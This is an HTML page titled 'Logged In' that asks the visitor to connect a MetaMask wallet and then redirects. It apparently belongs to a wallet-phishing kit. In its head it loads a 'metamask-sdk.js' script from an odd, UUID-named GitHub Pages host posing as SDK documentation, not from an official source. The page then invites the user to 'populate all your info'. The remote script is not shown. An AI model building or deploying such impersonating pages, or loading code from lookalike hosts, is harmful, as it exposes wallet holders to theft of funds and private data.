<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logged In</title>
    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <button id="walletConnectButton">Connect </button>
    <script>
    document.addEventListener('DOMContentLoaded', function () {
        const walletConnectButton = document.getElementById('walletConnectButton');

        if (walletConnectButton) {
            walletConnectButton.addEventListener('click', connectWallet);
        }

        function connectWallet() {
            if (typeof ethereum !== 'undefined') {
                ethereum.request({ method: 'eth_requestAccounts' })
                    .then((accounts) => {
                        console.log(accounts);
                        window.location.href = "metamask";
                    })
                    .catch((error) => {
                        console.error(error);
                    });
            } else {
                console.error("Ethereum object not found. Make sure MetaMask is installed. Download the extension and try again!");
            }
        }
    });
</script> 
    <div class="main">
        <header id="header">
            <span>Linked Wallet</span>
        </header>

    
        <h1>Welcome to the Logged In Page!</h1>
        <p>Your wallet is connected. Time to populate all your info</p>
    
    </div>

    <script src="walletConnected.js"></script> <!-- Include your JavaScript file for additional logic -->
</body>
</html>
